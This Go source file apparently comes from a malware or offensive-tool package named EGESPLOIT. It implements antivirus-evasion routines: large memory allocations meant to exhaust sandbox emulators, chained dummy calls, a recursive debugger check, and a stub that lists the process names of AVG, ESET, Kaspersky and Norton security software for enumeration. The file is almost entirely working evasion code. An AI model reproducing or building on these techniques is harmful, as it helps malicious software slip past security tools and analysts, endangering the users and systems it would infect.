package EGESPLOIT

//import "os/exec"
//import "strings"

var MagicNumber int64 = 0;  


func BypassAV(Rate int) {
  if Rate == 1 {
    AllocateFakeMemory()
  }else if Rate == 2 {
    AllocateFakeMemory()
    Jump()
  }else if Rate == 3 {
    AllocateFakeMemory()
    Jump()
    ProcessRecon()
  }else{

  }
}


func Jump() {
  MagicNumber++
  hop1()
}

func AllocateFakeMemory()  {
  for i := 0; i < 1000; i++ {
    var Size int = 30000000
    Buffer_1 := make([]byte, Size)
    Buffer_1[0] = 1
    var Buffer_2 [102400000]byte
    Buffer_2[0] = 0
  }
}

func CheckDebugger() {
  Flag,_,_ := IsDebuggerPresent.Call()
  if Flag != 0 {
    //Debugger Active !!
    CheckDebugger()
  }
}


func ProcessRecon() {

  //Enumarate AV processes...

  /* AVG
    avgidsagenta.exe
    avgcsrva.exe
    avgwdsvca.exe
    avgnsa.exe
    avgemca.exe
    avgrsa.exe
  */

  /* ESET
    egui.exe
  */

  /* KASPERSKY
    avpui.exe
  */


  /* NORTON
    NS.exe
  */


}


func hop1() {
  MagicNumber++
  hop2()
}
func hop2() {
  MagicNumber++
  hop3()
}
func hop3() {
  MagicNumber++
  hop4()
}
func hop4() {
  MagicNumber++
  hop5()
}
func hop5() {
  MagicNumber++
  hop6()
}
func hop6() {
  MagicNumber++
  hop7()
}
func hop7() {
  MagicNumber++
  hop8()
}
func hop8() {
  MagicNumber++
  hop9()
}
func hop9() {
  MagicNumber++
  hop10()
}
func hop10() {
  MagicNumber++
}
